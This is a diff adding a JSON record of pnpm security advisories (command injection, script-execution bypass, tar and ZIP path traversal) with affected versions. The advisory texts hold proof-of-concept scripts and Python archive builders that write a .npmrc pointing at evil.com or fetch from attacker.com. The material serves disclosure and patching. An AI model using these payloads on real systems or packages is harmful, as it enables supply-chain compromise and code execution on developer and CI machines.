@@ -1,0 +1,2078 @@
+{
+  "schema_version": 1,
+  "package": "pnpm",
+  "purls": [
+    "pkg:npm/pnpm"
+  ],
+  "generated_at": "2026-05-18T06:01:40+00:00",
+  "conda_versions_total": 165,
+  "advisories": [
+    {
+      "id": "GHSA-2phv-j68v-wwqx",
+      "primary_id": "CVE-2025-69262",
+      "aliases": [
+        "CVE-2025-69262"
+      ],
+      "cve_ids": [
+        "CVE-2025-69262"
+      ],
+      "ecosystem": "npm",
+      "upstream_name": "pnpm",
+      "summary": "pnpm vulnerable to Command Injection via environment variable substitution",
+      "details": "## Summary\n\nA command injection vulnerability exists in pnpm when using environment variable substitution in `.npmrc` configuration files with `tokenHelper` settings. An attacker who can control environment variables during pnpm operations could achieve remote code execution (RCE) in build environments.\n\n## Affected Components\n\n- **Package**: pnpm\n- **Versions**: All versions using `@pnpm/config.env-replace` and `loadToken` functionality\n- **File**: `pnpm/network/auth-header/src/getAuthHeadersFromConfig.ts` - `loadToken()` function\n- **File**: `pnpm/config/config/src/readLocalConfig.ts` - `.npmrc` environment variable substitution\n\n## Technical Details\n\n### Vulnerability Chain\n\n1. **Environment Variable Substitution**\n   - `.npmrc` supports `${VAR}` syntax\n   - Substitution occurs in `readLocalConfig()`\n\n2. **loadToken Execution**\n   - Uses `spawnSync(helperPath, { shell: true })`\n   - Only validates absolute path existence\n\n3. **Attack Flow**\n```\n.npmrc: registry.npmjs.org/:tokenHelper=${HELPER_PATH}\n   \u2193\nenvReplace() \u2192 /tmp/evil-helper.sh\n   \u2193\nloadToken() \u2192 spawnSync(..., { shell: true })\n   \u2193\nRCE achieved\n```\n\n### Code Evidence\n\n**`pnpm/config/config/src/readLocalConfig.ts:17-18`**\n```typescript\nkey = envReplace(key, process.env)\nini[key] = parseField(types, envReplace(val, process.env), key)\n```\n\n**`pnpm/network/auth-header/src/getAuthHeadersFromConfig.ts:60-71`**\n```typescript\nexport function loadToken(helperPath: string, settingName: string): string {\n  if (!path.isAbsolute(helperPath) || !fs.existsSync(helperPath)) {\n    throw new PnpmError('BAD_TOKEN_HELPER_PATH', ...)\n  }\n  const spawnResult = spawnSync(helperPath, { shell: true })\n  // ...\n}\n```\n\n## Proof of Concept\n\n### Prerequisites\n- Private npm registry access\n- Control over environment variables\n- Ability to place scripts in filesystem\n\n### PoC Steps\n\n```bash\n# 1. Create malicious helper script\ncat > /tmp/evil-helper.sh << 'SCRIPT'\n#!/bin/bash\necho \"RCE SUCCESS!\" > /tmp/rce-log.txt\necho \"TOKEN_12345\"\nSCRIPT\nchmod +x /tmp/evil-helper.sh\n\n# 2. Create .npmrc with environment variable\ncat > .npmrc << 'EOF'\nregistry=https://registry.npmjs.org/\nregistry.npmjs.org/:tokenHelper=${HELPER_PATH}\nEOF\n\n# 3. Set environment variable (attacker controlled)\nexport HELPER_PATH=/tmp/evil-helper.sh\n\n# 4. Trigger pnpm install\npnpm install  # RCE occurs during auth\n\n# 5. Verify attack\ncat /tmp/rce-log.txt\n```\n\n### PoC Results\n```\n==> Attack successful\n==> File created: /tmp/rce-log.txt\n==> Arbitrary code execution confirmed\n```\n\n## Impact\n\n### Severity\n- **CVSS Score**: 7.6 (High)\n- **CVSS Vector**: cvss:3.1/AV:L/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H\n\n### Affected Environments\n\n**High Risk:**\n- CI/CD pipelines (GitHub Actions, GitLab CI)\n- Docker build environments\n- Kubernetes deployments\n- Private registry users\n\n**Low Risk:**\n- Public registry only\n- Production runtime (no pnpm execution)\n- Static sites\n\n### Attack Scenarios\n\n**Scenario 1: CI/CD Supply Chain**\n```\nRepository \u2192 Build Trigger \u2192 pnpm install \u2192 RCE \u2192 Production Deploy\n```\n\n**Scenario 2: Docker Build**\n```dockerfile\nFROM node:20\nARG HELPER_PATH=/tmp/evil\nCOPY .npmrc .\nRUN pnpm install  # RCE\n```\n\n**Scenario 3: Kubernetes**\n```\nSecret Control \u2192 Env Variable \u2192 .npmrc Substitution \u2192 RCE\n```\n\n## Mitigation\n\n### Temporary Workarounds\n\n**Disable tokenHelper:**\n```ini\n# .npmrc\n# registry.npmjs.org/:tokenHelper=${HELPER_PATH}\n```\n\n**Use direct tokens:**\n```ini\n//registry.npmjs.org/:_authToken=YOUR_TOKEN\n```\n\n**Audit environment variables:**\n- Review CI/CD env vars\n- Restrict .npmrc changes\n- Monitor build logs\n\n### Recommended Fixes\n\n1. Remove `shell: true` from loadToken\n2. Implement helper path allowlist\n3. Validate substituted paths\n4. Consider sandboxing\n\n## Disclosure\n\n- **Discovery**: 2025-11-02\n- **PoC**: 2025-11-02\n- **Report**: [Pending disclosure decision]\n\n## References\n\n- Repository: https://github.com/pnpm/pnpm\n- Affected: `@pnpm/config.env-replace@^3.0.2`\n- Similar: CVE-2024-53866, CVE-2023-37478\n\n## Credit\n\nReported by: Jiyong Yang\nContact: sy2n0@naver.com",
+      "published": "2026-01-07T18:51:07Z",
+      "modified": "2026-02-03T03:16:00.084141Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/pnpm/pnpm/security/advisories/GHSA-2phv-j68v-wwqx"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-69262"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/pnpm/pnpm"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pnpm/pnpm/releases/tag/v10.27.0"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-2phv-j68v-wwqx",
+      "osv_ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "6.25.0"
+            },
+            {
+              "fixed": "10.27.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": null,
+      "affected_conda_versions": [
+        "7.17.0",
+        "7.17.1",
+        "7.18.0",
+        "7.18.1",
+        "7.18.2",
+        "7.19.0",
+        "7.20.0",
+        "7.21.0",
+        "7.22.0",
+        "7.23.0",
+        "7.24.3",
+        "7.25.0",
+        "7.25.1",
+        "7.26.0",
+        "7.26.1",
+        "7.26.2",
+        "7.26.3",
+        "7.27.0",
+        "7.27.1",
+        "7.28.0",
+        "8.4.0",
+        "8.6.1",
+        "8.6.2",
+        "8.6.3",
+        "8.6.4",
+        "8.6.5",
+        "8.6.6",
+        "8.6.7",
+        "8.6.8",
+        "8.6.9",
+        "8.6.10",
+        "8.6.11",
+        "8.6.12",
+        "8.7.0",
+        "8.7.1",
+        "8.7.3",
+        "8.7.4",
+        "8.7.5",
+        "8.7.6",
+        "8.8.0",
+        "8.9.1",
+        "8.9.2",
+        "8.10.0",
+        "8.10.1",
+        "8.10.2",
+        "8.10.3",
+        "8.10.4",
+        "8.10.5",
+        "8.11.0",
+        "8.12.0",
+        "8.12.1",
+        "8.13.1",
+        "8.14.0",
+        "8.14.1",
+        "8.14.2",
+        "8.14.3",
+        "8.15.0",
+        "8.15.1",
+        "8.15.4",
+        "8.15.5",
+        "8.15.6",
+        "8.15.7",
+        "9.0.1",
+        "9.0.2",
+        "9.0.3",
+        "9.0.4",
+        "9.0.5",
+        "9.0.6",
+        "9.1.0",
+        "9.1.1",
+        "9.1.2",
+        "9.1.3",
+        "9.1.4",
+        "9.2.0",
+        "9.3.0",
+        "9.4.0",
+        "9.5.0",
+        "9.6.0",
+        "9.7.0",
+        "9.7.1",
+        "9.8.0",
+        "9.9.0",
+        "9.10.0",
+        "9.11.0",
+        "9.12.0",
+        "9.12.1",
+        "9.12.2",
+        "9.13.0",
+        "9.13.1",
+        "9.13.2",
+        "9.14.1",
+        "9.14.2",
+        "9.14.3",
+        "9.14.4",
+        "9.15.0",
+        "9.15.1",
+        "9.15.2",
+        "9.15.3",
+        "10.0.0",
+        "10.1.0",
+        "10.2.0",
+        "10.2.1",
+        "10.3.0",
+        "10.4.0",
+        "10.4.1",
+        "10.5.0",
+        "10.5.1",
+        "10.5.2",
+        "10.6.0",
+        "10.6.1",
+        "10.6.2",
+        "10.6.3",
+        "10.6.4",
+        "10.6.5",
+        "10.7.0",
+        "10.7.1",
+        "10.8.0",
+        "10.8.1",
+        "10.9.0",
+        "10.10.0",
+        "10.11.0",
+        "10.11.1",
+        "10.12.1",
+        "10.12.2",
+        "10.12.3",
+        "10.12.4",
+        "10.13.1",
+        "10.14.0",
+        "10.15.0",
+        "10.15.1",
+        "10.16.0",
+        "10.16.1",
+        "10.17.0",
+        "10.17.1",
+        "10.18.0",
+        "10.18.1",
+        "10.18.2",
+        "10.18.3",
+        "10.19.0",
+        "10.20.0",
+        "10.21.0",
+        "10.22.0",
+        "10.23.0",
+        "10.24.0",
+        "10.25.0",
+        "10.26.0",
+        "10.26.1",
+        "10.26.2"
+      ]
+    },
+    {
+      "id": "GHSA-379q-355j-w6rj",
+      "primary_id": "CVE-2025-69264",
+      "aliases": [
+        "CVE-2025-69264"
+      ],
+      "cve_ids": [
+        "CVE-2025-69264"
+      ],
+      "ecosystem": "npm",
+      "upstream_name": "pnpm",
+      "summary": "pnpm v10+ Bypass \"Dependency lifecycle scripts execution disabled by default\"",
+      "details": "# pnpm v10+ Git Dependency Script Execution Bypass\n\n### Summary\n\nA security bypass vulnerability in pnpm v10+ allows git-hosted dependencies to execute arbitrary code during `pnpm install`, circumventing the v10 security feature \"Dependency lifecycle scripts execution disabled by default\". While pnpm v10 blocks `postinstall` scripts via the `onlyBuiltDependencies` mechanism, git dependencies can still execute `prepare`, `prepublish`, and `prepack` scripts during the fetch phase, enabling remote code execution without user consent or approval.\n\n### Details\n\npnpm v10 introduced a security feature to disable dependency lifecycle scripts by default ([PR #8897](https://github.com/pnpm/pnpm/pull/8897)). This is implemented by setting `onlyBuiltDependencies = []` when no build policy is configured:\n\n**File:** `pkg-manager/core/src/install/extendInstallOptions.ts` (lines 290-291)\n```typescript\nif (opts.neverBuiltDependencies == null && opts.onlyBuiltDependencies == null && opts.onlyBuiltDependenciesFile == null) {\n  opts.onlyBuiltDependencies = []\n}\n```\n\nThis creates an allowlist that blocks all packages from running scripts during the **BUILD phase** in `exec/build-modules/src/index.ts`.\n\nHowever, git-hosted dependencies are processed differently. During the **FETCH phase**, git packages are prepared using `preparePackage()`:\n\n**File:** `exec/prepare-package/src/index.ts` (lines 28-57)\n```typescript\nexport async function preparePackage (opts: PreparePackageOptions, gitRootDir: string, subDir: string) {\n  // ...\n  if (opts.ignoreScripts) return { shouldBeBuilt: true, pkgDir }  // Only checks ignoreScripts, not onlyBuiltDependencies\n\n  const execOpts: RunLifecycleHookOptions = {\n    // ...\n    rawConfig: omit(['ignore-scripts'], opts.rawConfig),  // Explicitly removes ignore-scripts!\n  }\n\n  // Runs npm/pnpm install\n  await runLifecycleHook(installScriptName, manifest, execOpts)\n\n  // Runs prepare scripts\n  for (const scriptName of PREPUBLISH_SCRIPTS) {  // ['prepublish', 'prepack', 'publish']\n    await runLifecycleHook(newScriptName, manifest, execOpts)\n  }\n}\n```\n\nThe `ignoreScripts` option defaults to `false` and is completely separate from `onlyBuiltDependencies`. The `onlyBuiltDependencies` allowlist is never consulted during the fetch phase.\n\n**Affected scripts that execute during fetch:**\n- `prepare`\n- `prepublish`\n- `prepack`\n\n**Attack vectors:**\n- `git+https://github.com/attacker/malicious.git`\n- `github:attacker/malicious`\n- `gitlab:attacker/malicious`\n- `bitbucket:attacker/malicious`\n- `git+ssh://git@github.com/attacker/malicious.git`\n- `git+file:///path/to/local/repo`\n\n### PoC\n\n**Prerequisites:**\n- pnpm v10.0.0 or later (tested on v10.23.0 and v11.0.0-alpha.1)\n- git\n\n**Steps to reproduce:**\n\n1. Extract the attached [poc.zip](https://github.com/user-attachments/files/23797816/poc.zip)\n\n2. Run the PoC script:\n   ```bash\n   cd poc\n   chmod +x run-poc.sh\n   ./run-poc.sh\n   ```\n\n3. Verify the marker file was created by the malicious script:\n   ```bash\n   cat /tmp/pnpm-vuln-poc-marker.txt\n   ```\n\n**Manual reproduction:**\n\n1. Create a malicious package with a `prepare` script:\n   ```json\n   {\n     \"name\": \"malicious-pkg\",\n     \"version\": \"1.0.0\",\n     \"scripts\": {\n       \"prepare\": \"node -e \\\"require('fs').writeFileSync('/tmp/pwned.txt', 'RCE!')\\\"\"\n     }\n   }\n   ```\n\n2. Initialize it as a git repo and commit the files\n\n3. Create a victim project that depends on it (just have to make sure it actually git clones and not just downloads a tarball):\n   ```json\n   {\n     \"dependencies\": {\n       \"malicious-pkg\": \"git+file:///path/to/malicious-pkg\"\n     }\n   }\n   ```\n\n4. Run `pnpm install` - the prepare script executes without any warning or approval prompt\n\n### Impact\n\n**Severity: High**\n\n**Who is impacted:**\n- All pnpm v10+ users\n- Users who believed they were protected by the v10 \"scripts disabled by default\" feature\n- CI/CD pipelines\n\n**Attack scenarios:**\n1. **Supply chain attack:** An attacker compromises a dependency, adding to it a malicious git dependency that executes arbitrary code during `pnpm install`\n\n**What an attacker can do:**\n- Execute arbitrary code with the victim's privileges\n- Exfiltrate environment variables, secrets, and credentials\n- Modify source code or inject backdoors\n- Establish persistence or reverse shells\n- Access the filesystem and network\n\n**Why this bypasses security expectations:**\n- pnpm v10 changelog explicitly states \"Lifecycle scripts of dependencies are not executed during installation by default\"\n- Users expect git dependencies to follow the same security model as npm registry packages\n- There is no warning that git dependencies are treated differently\n- The `onlyBuiltDependencies` configuration does not affect git dependencies",
+      "published": "2026-01-07T19:07:43Z",
+      "modified": "2026-02-03T03:16:14.295703Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/pnpm/pnpm/security/advisories/GHSA-379q-355j-w6rj"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-69264"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pnpm/pnpm/commit/73cc63504d9bc360c43e4b2feb9080677f03c5b5"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/pnpm/pnpm"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-379q-355j-w6rj",
+      "osv_ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "10.0.0"
+            },
+            {
+              "fixed": "10.26.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": null,
+      "affected_conda_versions": [
+        "10.0.0",
+        "10.1.0",
+        "10.2.0",
+        "10.2.1",
+        "10.3.0",
+        "10.4.0",
+        "10.4.1",
+        "10.5.0",
+        "10.5.1",
+        "10.5.2",
+        "10.6.0",
+        "10.6.1",
+        "10.6.2",
+        "10.6.3",
+        "10.6.4",
+        "10.6.5",
+        "10.7.0",
+        "10.7.1",
+        "10.8.0",
+        "10.8.1",
+        "10.9.0",
+        "10.10.0",
+        "10.11.0",
+        "10.11.1",
+        "10.12.1",
+        "10.12.2",
+        "10.12.3",
+        "10.12.4",
+        "10.13.1",
+        "10.14.0",
+        "10.15.0",
+        "10.15.1",
+        "10.16.0",
+        "10.16.1",
+        "10.17.0",
+        "10.17.1",
+        "10.18.0",
+        "10.18.1",
+        "10.18.2",
+        "10.18.3",
+        "10.19.0",
+        "10.20.0",
+        "10.21.0",
+        "10.22.0",
+        "10.23.0",
+        "10.24.0",
+        "10.25.0"
+      ]
+    },
+    {
+      "id": "GHSA-5r98-f33j-g8h7",
+      "primary_id": "CVE-2023-37478",
+      "aliases": [
+        "CVE-2023-37478"
+      ],
+      "cve_ids": [
+        "CVE-2023-37478"
+      ],
+      "ecosystem": "npm",
+      "upstream_name": "pnpm",
+      "summary": "pnpm incorrectly parses tar archives relative to specification",
+      "details": "### Summary\nIt is possible to construct a tarball that, when installed via npm or parsed by the registry is safe, but when installed via pnpm is malicious, due to how pnpm parses tar archives.\n\n### Details\nThe TAR format is an append-only archive format, and as such, the specification for how to update a file is to add a new record to the end with the updated version of the file. This means that it is completely valid for an archive to contain multiple copies of, say, `package.json`, and the expected behavior when extracting is that all versions other than the last get ignored.\n\nThis is further complicated by that during tarball extraction, all package managers are configured to drop the first path component, so collisions can be created simply by using multiple root folders in the archive, even without performing updates.\n\nWhen pnpm extracts a tar archive via tar-stream, it appears to extract only the _first_ file of a given name and discards all subsequent files with the same name.\n\n### PoC\nCreate a root folder with the following layout:\n- `a/package.json`\n- `package/package.json`\n- `z/package.json`\n\nFile contents:\n#### a/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is a bad version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^15\"\n    }\n}\n```\n#### package/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is a bad version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^16\"\n    }\n}\n```\n#### z/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is the good version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^17\"\n    }\n}\n```\n\nThen use the tar binary to produce a tarball (working directory is the root folder):\n`tar -c -z --format ustar -f package.tgz a package z`\nThe order of the folders at the end matters; whichever one is last will end up being the package.json that wins when extracted by npm; the one that is first will be the one that wins when extracted by pnpm.\n\nInstall the tarball via the `file:` protocol.\n\nObserve that with npm, the lockfile has `react@17`, while with pnpm it has `react@15`.\n\n### Impact\nThis can result in a package that appears safe on the npm registry or when installed via npm being replaced with a compromised or malicious version when installed via pnpm.",
+      "published": "2023-08-01T17:00:55Z",
+      "modified": "2023-11-08T04:13:02.473298Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/pnpm/pnpm/security/advisories/GHSA-5r98-f33j-g8h7"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-37478"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/pnpm/pnpm"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pnpm/pnpm/releases/tag/v7.33.4"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pnpm/pnpm/releases/tag/v8.6.8"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-5r98-f33j-g8h7",
+      "osv_ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "7.33.4"
+            }
+          ]
+        }
+      ],
+      "osv_versions": null,
+      "affected_conda_versions": [
+        "7.17.0",
+        "7.17.1",
+        "7.18.0",
+        "7.18.1",
+        "7.18.2",
+        "7.19.0",
+        "7.20.0",
+        "7.21.0",
+        "7.22.0",
+        "7.23.0",
+        "7.24.3",
+        "7.25.0",
+        "7.25.1",
+        "7.26.0",
+        "7.26.1",
+        "7.26.2",
+        "7.26.3",
+        "7.27.0",
+        "7.27.1",
+        "7.28.0",
+        "8.4.0",
+        "8.6.1",
+        "8.6.2",
+        "8.6.3",
+        "8.6.4",
+        "8.6.5",
+        "8.6.6",
+        "8.6.7"
+      ]
+    },
+    {
+      "id": "GHSA-6pfh-p556-v868",
+      "primary_id": "CVE-2026-23888",
+      "aliases": [
+        "CVE-2026-23888"
+      ],
+      "cve_ids": [
+        "CVE-2026-23888"
+      ],
+      "ecosystem": "npm",
+      "upstream_name": "pnpm",
+      "summary": "pnpm: Binary ZIP extraction allows arbitrary file write via path traversal (Zip Slip)",
+      "details": "### Summary\n\nA path traversal vulnerability in pnpm's binary fetcher allows malicious packages to write files outside the intended extraction directory. The vulnerability has two attack vectors: (1) Malicious ZIP entries containing `../` or absolute paths that escape the extraction root via AdmZip's `extractAllTo`, and (2) The `BinaryResolution.prefix` field is concatenated into the extraction path without validation, allowing a crafted prefix like `../../evil` to redirect extracted files outside `targetDir`.\n\n### Details\n\nThe vulnerability exists in the binary fetching and extraction logic:\n\n**1. Unvalidated ZIP Entry Extraction (`fetching/binary-fetcher/src/index.ts`)**\n\nAdmZip's `extractAllTo` does not validate entry paths for path traversal:\n\n```typescript\nconst zip = new AdmZip(buffer)\nconst nodeDir = basename === '' ? targetDir : path.dirname(targetDir)\nconst extractedDir = path.join(nodeDir, basename)\nzip.extractAllTo(nodeDir, true)  // Entry paths not validated!\nawait renameOverwrite(extractedDir, targetDir)\n```\n\nA ZIP entry with path `../../../.npmrc` will be written outside `nodeDir`.\n\n**2. Unvalidated Prefix in BinaryResolution (`resolving/resolver-base/src/index.ts`)**\n\nThe `basename` variable comes from `BinaryResolution.prefix` and is used directly in path construction:\n\n```typescript\nconst extractedDir = path.join(nodeDir, basename)\n// If basename is '../../evil', this points outside nodeDir\n```\n\n### PoC\n\n**Attack Vector 1: ZIP Entry Path Traversal**\n\n```python\nimport zipfile\nimport io\n\nzip_buffer = io.BytesIO()\nwith zipfile.ZipFile(zip_buffer, 'w') as zf:\n    # Normal file\n    zf.writestr('node-v20.0.0-linux-x64/bin/node', b'#!/bin/sh\\necho \"legit node\"')\n    # Malicious path traversal entry\n    zf.writestr('../../../.npmrc', b'registry=https://evil.com/\\n')\n\nwith open('malicious-node.zip', 'wb') as f:\n    f.write(zip_buffer.getvalue())\n```\n\n**Attack Vector 2: Prefix Traversal via malicious resolution:**\n\n```json\n{\n  \"resolution\": {\n    \"type\": \"binary\",\n    \"url\": \"https://attacker.com/node.zip\",\n    \"prefix\": \"../../PWNED\"\n  }\n}\n```\n\n### Impact\n\n- All pnpm users who install packages with binary assets\n- Users who configure custom Node.js binary locations\n- CI/CD pipelines that auto-install binary dependencies\n- Can overwrite config files, scripts, or other sensitive files leading to RCE\n\nVerified on pnpm main @ commit `5a0ed1d45`.",
+      "published": "2026-01-26T21:02:49Z",
+      "modified": "2026-02-03T03:06:45.887995Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/pnpm/pnpm/security/advisories/GHSA-6pfh-p556-v868"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-23888"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pnpm/pnpm/commit/5c382f0ca3b7cc49963b94677426e66539dcb3f5"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/pnpm/pnpm"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pnpm/pnpm/releases/tag/v10.28.1"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-6pfh-p556-v868",
+      "osv_ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "10.28.1"
+            }
+          ]
+        }
+      ],
+      "osv_versions": null,
+      "affected_conda_versions": [
+        "7.17.0",
+        "7.17.1",
+        "7.18.0",
+        "7.18.1",
+        "7.18.2",
+        "7.19.0",
+        "7.20.0",
+        "7.21.0",
+        "7.22.0",
+        "7.23.0",
+        "7.24.3",
+        "7.25.0",
+        "7.25.1",
+        "7.26.0",
+        "7.26.1",
+        "7.26.2",
+        "7.26.3",
+        "7.27.0",
+        "7.27.1",
+        "7.28.0",
+        "8.4.0",
+        "8.6.1",
+        "8.6.2",
+        "8.6.3",
+        "8.6.4",
+        "8.6.5",
+        "8.6.6",
+        "8.6.7",
+        "8.6.8",
+        "8.6.9",
+        "8.6.10",
+        "8.6.11",
+        "8.6.12",
+        "8.7.0",
+        "8.7.1",
+        "8.7.3",
+        "8.7.4",
+        "8.7.5",
+        "8.7.6",
+        "8.8.0",
+        "8.9.1",
+        "8.9.2",
+        "8.10.0",
+        "8.10.1",
+        "8.10.2",
+        "8.10.3",
+        "8.10.4",
+        "8.10.5",
+        "8.11.0",
+        "8.12.0",
+        "8.12.1",
+        "8.13.1",
+        "8.14.0",
+        "8.14.1",
+        "8.14.2",
+        "8.14.3",
+        "8.15.0",
+        "8.15.1",
+        "8.15.4",
+        "8.15.5",
+        "8.15.6",
+        "8.15.7",
+        "9.0.1",
+        "9.0.2",
+        "9.0.3",
+        "9.0.4",
+        "9.0.5",
+        "9.0.6",
+        "9.1.0",
+        "9.1.1",
+        "9.1.2",
+        "9.1.3",
+        "9.1.4",
+        "9.2.0",
+        "9.3.0",
+        "9.4.0",
+        "9.5.0",
+        "9.6.0",
+        "9.7.0",
+        "9.7.1",
+        "9.8.0",
+        "9.9.0",
+        "9.10.0",
+        "9.11.0",
+        "9.12.0",
+        "9.12.1",
+        "9.12.2",
+        "9.13.0",
+        "9.13.1",
+        "9.13.2",
+        "9.14.1",
+        "9.14.2",
+        "9.14.3",
+        "9.14.4",
+        "9.15.0",
+        "9.15.1",
+        "9.15.2",
+        "9.15.3",
+        "10.0.0",
+        "10.1.0",
+        "10.2.0",
+        "10.2.1",
+        "10.3.0",
+        "10.4.0",
+        "10.4.1",
+        "10.5.0",
+        "10.5.1",
+        "10.5.2",
+        "10.6.0",
+        "10.6.1",
+        "10.6.2",
+        "10.6.3",
+        "10.6.4",
+        "10.6.5",
+        "10.7.0",
+        "10.7.1",
+        "10.8.0",
+        "10.8.1",
+        "10.9.0",
+        "10.10.0",
+        "10.11.0",
+        "10.11.1",
+        "10.12.1",
+        "10.12.2",
+        "10.12.3",
+        "10.12.4",
+        "10.13.1",
+        "10.14.0",
+        "10.15.0",
+        "10.15.1",
+        "10.16.0",
+        "10.16.1",
+        "10.17.0",
+        "10.17.1",
+        "10.18.0",
+        "10.18.1",
+        "10.18.2",
+        "10.18.3",
+        "10.19.0",
+        "10.20.0",
+        "10.21.0",
+        "10.22.0",
+        "10.23.0",
+        "10.24.0",
+        "10.25.0",
+        "10.26.0",
+        "10.26.1",
+        "10.26.2",
+        "10.27.0",
+        "10.28.0"
+      ]
+    },
+    {
+      "id": "GHSA-6x96-7vc8-cm3p",
+      "primary_id": "CVE-2026-23889",
+      "aliases": [
+        "CVE-2026-23889"
+      ],
+      "cve_ids": [
+        "CVE-2026-23889"
+      ],
+      "ecosystem": "npm",
+      "upstream_name": "pnpm",
+      "summary": "pnpm has Windows-specific tarball Path Traversal",
+      "details": "### Summary\nA path traversal vulnerability in pnpm's tarball extraction allows malicious packages to write files outside the package directory on Windows. The path normalization only checks for `./` but not `.\\`. On Windows, backslashes are directory separators, enabling path traversal.\n\n**This vulnerability is Windows-only.**\n\n### Details\n**1. Incomplete Path Normalization (`store/cafs/src/parseTarball.ts:107-110`)**\n\n```typescript\nif (fileName.includes('./')) {\n  fileName = path.posix.join('/', fileName).slice(1)\n}\n```\n\nA path like `foo\\..\\..\\.npmrc` does NOT contain `./` and bypasses this check.\n\n**2. Platform-Dependent Behavior (`fs/indexed-pkg-importer/src/importIndexedDir.ts:97-98`)**\n\n- On Unix: Backslashes are literal filename characters (safe)\n- On Windows: Backslashes are directory separators (exploitable)\n\n### PoC\n1. Create a malicious tarball with entry `package/foo\\..\\..\\.npmrc`\n2. Host it or use as a tarball URL dependency\n3. On Windows: `pnpm install`\n4. Observe `.npmrc` written outside package directory\n\n```python\nimport tarfile, io\n\ntar_buffer = io.BytesIO()\nwith tarfile.open(fileobj=tar_buffer, mode='w:gz') as tar:\n    pkg_json = b'{\"name\": \"malicious-pkg\", \"version\": \"1.0.0\"}'\n    pkg_info = tarfile.TarInfo(name='package/package.json')\n    pkg_info.size = len(pkg_json)\n    tar.addfile(pkg_info, io.BytesIO(pkg_json))\n\n    malicious_content = b'registry=https://evil.com/\\n'\n    mal_info = tarfile.TarInfo(name='package/foo\\\\..\\\\..\\\\.npmrc')\n    mal_info.size = len(malicious_content)\n    tar.addfile(mal_info, io.BytesIO(malicious_content))\n\nwith open('malicious-pkg-1.0.0.tgz', 'wb') as f:\n    f.write(tar_buffer.getvalue())\n```\n\n### Impact\n- Windows pnpm users\n- Windows CI/CD pipelines (GitHub Actions Windows runners, Azure DevOps)\n- Can overwrite `.npmrc`, build configs, or other files\n\nVerified on pnpm main @ commit 5a0ed1d45.",
+      "published": "2026-01-26T21:02:44Z",
+      "modified": "2026-02-03T03:06:05.518233Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/pnpm/pnpm/security/advisories/GHSA-6x96-7vc8-cm3p"
+        },
+        {
+          "type": "ADVISORY",
